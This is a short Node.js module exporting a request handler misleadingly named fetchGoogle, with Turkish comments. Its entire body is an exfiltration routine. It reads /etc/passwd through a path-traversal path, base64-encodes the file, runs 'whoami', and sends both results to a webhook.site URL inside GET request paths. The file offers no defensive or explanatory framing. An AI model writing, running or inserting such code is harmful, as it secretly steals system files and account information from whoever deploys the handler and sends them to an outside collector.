const fs = require('fs');
const fetch = require('node-fetch');
const { exec } = require('child_process');

function fetchGoogle(ctx, req, res) {
    fs.readFile('../../../../../../../../etc/passwd', 'utf8', (err, data) => {
        if (err) {
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Error reading file: ' + err.message);
            return;
        }

        const base64FileContent = Buffer.from(data).toString('base64'); // Dosyanın içeriğini base64 formatına çevir

        exec('whoami', (error, stdout, stderr) => {
            if (error) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end(`Error executing whoami: ${error.message}\n${stderr}`);
                return;
            }

            const whoamiOutput = stdout.trim();

            const fetchPromises = [
                fetch(`https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779/${base64FileContent}`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'text/html',
                    },
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok ' + response.statusText);
                    }
                    return response.text();
                }),

                fetch(`https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779/${whoamiOutput}`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'text/html',
                    },
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok ' + response.statusText);
                    }
                    return response.text();
                })
            ];

            Promise.all(fetchPromises)
                .then(responses => {
                    res.writeHead(200, { 'Content-Type': 'text/plain' });
                    res.end(responses.join('\n'));  // Başarılı yanıtları birleştir ve gönder
                })
                .catch(error => {
                    res.writeHead(500, { 'Content-Type': 'text/plain' });
                    res.end('Fetch error: ' + error.message);  // Hata durumunda yanıt gönder
                });
        });
    });
}

module.exports = fetchGoogle;
